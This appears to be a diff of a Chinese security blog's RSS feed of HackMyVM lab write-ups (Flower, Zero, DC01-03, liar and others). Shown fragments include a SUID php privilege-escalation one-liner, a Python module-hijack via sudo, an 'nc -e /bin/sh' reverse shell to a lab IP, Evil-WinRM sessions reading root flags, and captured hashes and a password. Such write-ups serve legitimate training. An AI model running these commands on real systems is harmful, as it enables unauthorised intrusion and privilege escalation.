+]]></description><link>https://www.c1trus.top/24-渗透/hmv/34.hacked.html</link><guid isPermaLink="false">24-渗透/HMV/34.hacked.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[33.pickle]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -5469,7 +5691,7 @@ def secret_page():
 if __name__ == '__main__':
         app.run(host='0.0.0.0', port=1337, debug=True)
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/33.pickle.html</link><guid isPermaLink="false">24-渗透/HMV/33.pickle.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[32.UnbakedPie]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/33.pickle.html</link><guid isPermaLink="false">24-渗透/HMV/33.pickle.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[32.UnbakedPie]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -5614,7 +5836,7 @@ ps: dont be mad us, we hope you learn something new
 
 flag: Unb4ked_GOtcha!
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/32.unbakedpie.html</link><guid isPermaLink="false">24-渗透/HMV/32.UnbakedPie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[31.quoted]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/32.unbakedpie.html</link><guid isPermaLink="false">24-渗透/HMV/32.UnbakedPie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[31.quoted]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -6070,7 +6292,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-26 21:06:
 
 <br>在试试root的flag<br>也可以<br>
 <img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126223455.png" referrerpolicy="no-referrer"><br>HMV{Username_Is_My_Hint}
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/30.runas.html</link><guid isPermaLink="false">24-渗透/HMV/30.runas.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.quick]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/30.runas.html</link><guid isPermaLink="false">24-渗透/HMV/30.runas.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.quick]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -6141,7 +6363,7 @@ echo 'okok');
 <br>这里面发现php具有suid权限<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.009.png" referrerpolicy="no-referrer"><br>cd /usr/bin
 CMD="/bin/sh"
 ./php7.0 -r "pcntl\_exec('/bin/sh', ['-p']);"
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.010.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/3.quick.html</link><guid isPermaLink="false">24-渗透/HMV/3.quick.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[29.Always]]></title><description><![CDATA[ 
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.010.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/3.quick.html</link><guid isPermaLink="false">24-渗透/HMV/3.quick.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[29.Always]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -6438,7 +6660,7 @@ nt authority\system
 
 <br>最后是flag<br>HMV{You_Found_Me!}
 <br>HMV{White_Flag_Raised}
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/29.always.html</link><guid isPermaLink="false">24-渗透/HMV/29.Always.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[28.Troya]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/29.always.html</link><guid isPermaLink="false">24-渗透/HMV/29.Always.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[28.Troya]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Troya
@@ -6459,7 +6681,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.14.2
 MAC Address: 08:00:27:D0:C1:B2 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
-<br>目录扫描<br>扫描啥都没有<br>主页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" referrerpolicy="no-referrer"><br>抓包看看]]></description><link>https://www.c1trus.top/24-渗透/hmv/28.troya.html</link><guid isPermaLink="false">24-渗透/HMV/28.Troya.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[27.Nessus]]></title><description><![CDATA[ 
+<br>目录扫描<br>扫描啥都没有<br>主页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" referrerpolicy="no-referrer"><br>抓包看看]]></description><link>https://www.c1trus.top/24-渗透/hmv/28.troya.html</link><guid isPermaLink="false">24-渗透/HMV/28.Troya.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[27.Nessus]]></title><description><![CDATA[ 
  <br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -6864,7 +7086,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\admin\Documents&gt;
-<br>成功登录。管理员用户运行cs后门上线拿flag即可]]></description><link>https://www.c1trus.top/24-渗透/hmv/27.nessus.html</link><guid isPermaLink="false">24-渗透/HMV/27.Nessus.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/kxrxpqqr598.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/hmv/assets/kxrxpqqr598.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[26.TriplAdvisor]]></title><description><![CDATA[ 
+<br>成功登录。管理员用户运行cs后门上线拿flag即可]]></description><link>https://www.c1trus.top/24-渗透/hmv/27.nessus.html</link><guid isPermaLink="false">24-渗透/HMV/27.Nessus.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/kxrxpqqr598.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/kxrxpqqr598.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[26.TriplAdvisor]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -7079,7 +7301,7 @@ SMB         192.168.56.17   445    SIMPLE           [-] Simple\marcos:SuperPassw
 被西班牙语的键盘和操作系统恶心到了🤮
 <br>SIMPLE{ASPXT0SH311}
 <br>SIMPLE{S31MP3R50N4T3PR1V1L363}
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/25.simple.html</link><guid isPermaLink="false">24-渗透/HMV/25.Simple.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[24.liar]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/25.simple.html</link><guid isPermaLink="false">24-渗透/HMV/25.Simple.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[24.liar]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -7376,7 +7598,7 @@ SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Desha
 <br>可以发现这个用户是属于管理员组的<br>直接读取flag<br>\*Evil-WinRM\* PS C:\users\nica&gt; .\runascs.exe akanksha sweetgirl "cmd /c type c:\users\Administrador\root.txt"
 
 HMV1STWINDOWZ
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/24.liar.html</link><guid isPermaLink="false">24-渗透/HMV/24.liar.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[23.Zero]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/24.liar.html</link><guid isPermaLink="false">24-渗透/HMV/24.liar.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[23.Zero]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -7544,7 +7766,7 @@ run
 excute -f C:\\4444.exe
 <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" referrerpolicy="no-referrer"><br>system权限 已经拿下了<br>HMV{Z3r0\_l0g0n\_!s\_Pr3tty\_D4ng3r0u$}
 HMV{D0nt\_r3us3\_p4$$w0rd5!}
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/23.zero.html</link><guid isPermaLink="false">24-渗透/HMV/23.Zero.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[22.DC03]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/23.zero.html</link><guid isPermaLink="false">24-渗透/HMV/23.Zero.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[22.DC03]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -7761,7 +7983,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 \*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
 b8e59a7d4020792c412da75e589ff4fc
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/22.dc03.html</link><guid isPermaLink="false">24-渗透/HMV/22.DC03.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[21.DC02]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/22.dc03.html</link><guid isPermaLink="false">24-渗透/HMV/22.DC03.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[21.DC02]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -7997,7 +8219,7 @@ SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\DC01
 
 \*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
 d41d8cd98f00b204e9800998ecf8427e
-<br>参考wp:<a rel="noopener nofollow" class="external-link" href="https://christelise.github.io/posts/dc02-walkthrough/" target="_blank">https://christelise.github.io/posts/dc02-walkthrough/</a>]]></description><link>https://www.c1trus.top/24-渗透/hmv/21.dc02.html</link><guid isPermaLink="false">24-渗透/HMV/21.DC02.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[20.DC01]]></title><description><![CDATA[ 
+<br>参考wp:<a rel="noopener nofollow" class="external-link" href="https://christelise.github.io/posts/dc02-walkthrough/" target="_blank">https://christelise.github.io/posts/dc02-walkthrough/</a>]]></description><link>https://www.c1trus.top/24-渗透/hmv/21.dc02.html</link><guid isPermaLink="false">24-渗透/HMV/21.DC02.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[20.DC01]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -8246,7 +8468,7 @@ USER CLAIMS INFORMATION
 6bab1f09a7403980bfeb4c2b412be47b
 \*Evil-WinRM\* PS C:\Users\FileServer$\Documents&gt; type C:\Users\administrator\desktop\root.txt
 a9564ebc3289b7a14551baf8ad5ec60a
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/20.dc01.html</link><guid isPermaLink="false">24-渗透/HMV/20.DC01.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Flower]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/20.dc01.html</link><guid isPermaLink="false">24-渗透/HMV/20.DC01.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Flower]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. webshell" data-href="#2. webshell" href="https://www.c1trus.top/about:blank#2._webshell" class="internal-link" target="_self" rel="noopener nofollow">2. webshell</a>
@@ -8278,221 +8500,7 @@ pickle.dump(diary,p)
 <br>分析脚本可以发现这个脚本会引入pickle模块，然后执行代码<br>这里我们在同级目录新建一个pickle.py文件。这样就会引入我们的这个pickle.py 而不会引入模块库里面的pickle<br>新建一个pickle.py文件<br>将反弹命令写进这个文件里面 <br>import os;os.system("/bin/bash")
 <br>然后执行diary.py<br>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
 <br>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py<br>system('nc -e /bin/sh 192.168.9.3 9999')
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/2.flower.html</link><guid isPermaLink="false">24-渗透/HMV/2.Flower.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[19.rubies]]></title><description><![CDATA[ 
- <br><br>
-<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
-<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
-
-<br><a data-tooltip-position="top" aria-label="2.1. git泄露" data-href="#2.1. git泄露" href="https://www.c1trus.top/about:blank#2.1._git泄露" class="internal-link" target="_self" rel="noopener nofollow">2.1. git泄露</a>
-<br><a data-tooltip-position="top" aria-label="2.2. 文件上传" data-href="#2.2. 文件上传" href="https://www.c1trus.top/about:blank#2.2._文件上传" class="internal-link" target="_self" rel="noopener nofollow">2.2. 文件上传</a>
-
-
-<br><a data-tooltip-position="top" aria-label="3. 代码审计 RCE利用" data-href="#3. 代码审计 RCE利用" href="https://www.c1trus.top/about:blank#3._代码审计_RCE利用" class="internal-link" target="_self" rel="noopener nofollow">3. 代码审计 RCE利用</a>
